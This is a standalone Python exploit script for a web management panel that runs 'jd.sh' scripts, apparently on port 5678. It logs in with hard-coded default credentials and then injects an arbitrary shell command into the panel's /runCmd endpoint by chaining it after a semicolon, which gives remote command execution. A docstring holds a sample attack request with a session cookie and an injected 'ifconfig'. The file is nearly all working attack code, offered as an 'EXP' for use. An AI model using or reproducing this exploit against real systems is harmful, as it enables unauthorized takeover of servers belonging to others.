import requests
import json
import sys
import argparse

def login(url,username="useradmin",password="supermanito"):
    loginReq = requests.Session()
    payload = {
            "username":username,
            "password":password
            }
    headers1 = {
        "Accept": "*/*",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }

    headers = {
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": url,
        "Referer": url,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }

    loginReq.get(url, headers=headers1)
    content = loginReq.post(url + "auth",data=payload,headers=headers)
    response = json.loads(content.text)
    # print(response["err"])
    # print(loginReq.cookies)
    if response["err"] == 0:
        print("login success")
        return(loginReq)
    else:
        print("login failure")
        raise RuntimeError("Can't login,beacuse -> "+response["msg"])

def exploit(url,session,command):
    ''' POST form looks like
    POST /runCmd HTTP/1.1
    Host: XXX.XXX.XXX.XXXX:5678
    Content-Length: 51
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: connect.0.3349226518321824=s%3AWfJDGLRc0_vdAuXSWDOYku1qMSLXcZjv.vr52DLelVmWNvsY2q7SQCH%2B8KmDzT0ds2eRw7Fay0Sc
    Connection: close

    cmd=bash+jd.sh+bean_change%3Bifconfig%3B&delay=1000
    '''
    headers = {
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    datas = {
        "cmd":"bash+jd.sh+bean_change;"+command+";",
        "delay":"1000"
    }
    response = session.post(url+"runCmd",data=datas,headers=headers)
    # print(session.cookies)
    objectResponse = json.loads(response.text)
    # print(objectResponse)
    if objectResponse["err"] == 0:
        print("execute success","\n")
        print("$ "+command)
        for line in objectResponse["msg"].split("\n"):
            print(line)
    else:
        print("execute failure")
        raise RuntimeError("Can't execute --> "+objectResponse["msg"])

if __name__ == "__main__" :
    parser = argparse.ArgumentParser(description='this is the EXP of JD fuck')
    parser.add_argument("-u",metavar="url",type=str,help="url there, e.g: http://127.0.0.1:5678/")
    parser.add_argument("-c",metavar="command",type=str,help="execute command, e.g: ls")
    # print(sys.argv[1:])
    args = vars( parser.parse_args(sys.argv[1:]) )
    url = args["u"]
    command = args["c"]
    exploit(url,login(url),command)
